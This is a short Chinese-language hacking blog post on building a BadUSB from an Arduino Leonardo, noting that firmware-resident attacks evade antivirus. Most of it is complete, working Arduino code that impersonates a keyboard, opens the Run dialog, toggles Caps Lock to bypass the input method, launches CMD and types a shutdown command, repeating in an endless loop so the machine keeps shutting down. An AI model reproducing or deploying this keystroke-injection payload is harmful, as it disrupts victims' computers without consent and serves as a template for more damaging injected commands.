---
title: Arduino Leonardo 打造 Bad USB
date: 2016-11-27 02:48:23
tags: hack 
categories: hack
---

嘿嘿嘿，又是一篇猥琐小文。

<!--more -->

# 简介

BadUSB最可怕的一点是恶意代码存在于U盘的固件中，由于PC上的杀毒软件无法访问到U盘存放固件的区域，因此也就意味着杀毒软件和U盘格式化都无法应对BadUSB进行攻击。

# 目标
Bad USB

# 效果
![](/content/images/preview.gif)

# 原料
1. Arduino Leonardo
2. 普通安卓USB线

# 🌰

```C
#include <Keyboard.h>

void setup() {//初始化
   Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500); 
  Keyboard.println("CMD");
  delay(500); 
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(3000); 
  Keyboard.println("shutdown -s -t 10");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
   Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500); 
  Keyboard.println("CMD");
  delay(500); 
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(3000); 
  Keyboard.println("shutdown -s -t 10");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯 
}
```


# 参考
http://www.freebuf.com/sectool/107242.html
